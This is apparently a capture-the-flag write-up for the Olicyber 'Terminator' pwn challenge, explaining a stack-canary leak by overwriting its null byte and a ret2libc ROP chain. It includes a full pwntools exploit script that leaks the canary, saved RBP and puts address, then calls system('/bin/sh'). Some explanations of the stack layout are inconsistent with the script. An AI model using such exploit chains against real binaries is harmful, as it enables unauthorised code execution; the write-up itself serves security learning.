---
title: "Terminator — Canary Leak + Full ret2libc"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "stack-canary", "ret2libc", "rop", "aslr-bypass", "pwntools"]
difficulty: "advanced"
summary: "Overwrite the canary's null byte to leak the full 8-byte cookie over printf, simultaneously leak a saved RBP to base the stack, then use puts@got to find libc base and call system('/bin/sh') — all in two trips through the same vulnerable function."
---

## The Challenge

The binary has a stack canary, ASLR, and links against a non-patched libc. No win function exists. The vulnerable function is a `welcome` routine that echoes user input — if you overwrite the null byte at the bottom of the canary, `printf` or a similar function will print right through it into the canary bytes and beyond.

## Approach

The canary always has its lowest byte set to `\x00` to prevent accidental string traversal. Overwriting that byte with anything non-null causes `printf` to walk over the canary value itself. Two leaks come out in one receive:

- Bytes 0–6 after the overwrite: the remaining 7 bytes of the canary (add `\x00` prefix to reconstruct it).
- Bytes 7–12: a saved RBP value, which pins the stack layout relative to the current frame.

With the canary known, round two is a classic ret2libc ROP:

1. First pass: send `pop rdi + got['puts'] + plt['puts'] + main` to leak the runtime address of `puts` and restart `main`.
2. Compute `libc.address = leaked_puts - libc.sym['puts']`.
3. Second pass: send `pop rdi + &"/bin/sh" + system` — both addresses now resolved in libc.

```
PAYLOAD = padding + saved_rbp + pop_rdi + got_puts + plt_puts + main + canary + rbp
```

The canary is placed at `+16` into the payload (after 16 bytes of data) and `rbp` is reconstructed from the leak.

## Solution

```python
#!/usr/bin/env python3
from pwn import ELF, remote, gdb, p64, unpack, args, u64

e = ELF('./terminator', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote('terminator.challs.olicyber.it', 10307)
else:
    p = gdb.debug('./terminator', '''
b *welcome+157
continue''')
p.recvuntil(b'> ')
p.sendline(b'a'*55) # overwirte null byte of the canary
p.recvuntil(b'\n\n')
t = p.recvuntil(b'Nice')
canary = b'\x00' + t[0:7] # read the canary
rbp = unpack(t[7:13], len(t[7:13])*8) - 0x8 * 10
p.recvuntil(b'> ')

puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
pop_rdi = p64(0x4012fb)


PAYLOAD = b'a'*16 + p64(rbp) + pop_rdi + puts_got + puts_plt + p64(e.symbols['main']) + canary + p64(rbp) # idk
p.send(PAYLOAD)
p.recvuntil(b'bye!\n')
print(hex(libc.sym['puts'])) # sembra che quello giusto sia 0x80ed0
puts = p.recvline().replace(b'\n',b'').ljust(8, b'\x00')
libc.address = u64(puts) - libc.sym['puts']
print(hex(libc.address))
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
system = p64(libc.symbols['system'])

print(bin_sh, system)

p.recvuntil(b'> ')
p.sendline(b'a'*55) # overwirte null byte of the canary
p.recvuntil(b'\n\n')
t = p.recvuntil(b'Nice')
canary = b'\x00' + t[0:7] # read the canary
rbp = unpack(t[7:13], len(t[7:13])*8) - 0x8 * 9
p.recvuntil(b'> ')

PAYLOAD = b'a'*24 + p64(rbp) + pop_rdi + bin_sh + system + canary + p64(rbp) # idk
p.send(PAYLOAD)
p.interactive()
```

Round 1: `b'a'*55` overwrites the canary's null byte. The echo prints the canary and RBP. `b'\x00' + t[0:7]` reconstructs the full 8-byte canary. Round 2 leaks `puts` from the GOT, computes `libc.address`. Round 3 (reusing the same `welcome` path) sends `system("/bin/sh")`.

The inline comment `# idk` in the script is a leftover from debugging the exact stack layout — `0x8 * 10` vs `0x8 * 9` for the RBP offset between round 1 and round 3 comes from the different alignment of the two call chains.

## What I Learned

Canary bypass through null-byte overwrite is one of the most reliable techniques: the canary is only protected by that initial `\x00`, and any echo that calls `printf`/`puts` with the buffer pointer will walk right through it once that byte is gone. Pairing the canary leak with a simultaneous RBP leak saves an extra round-trip.
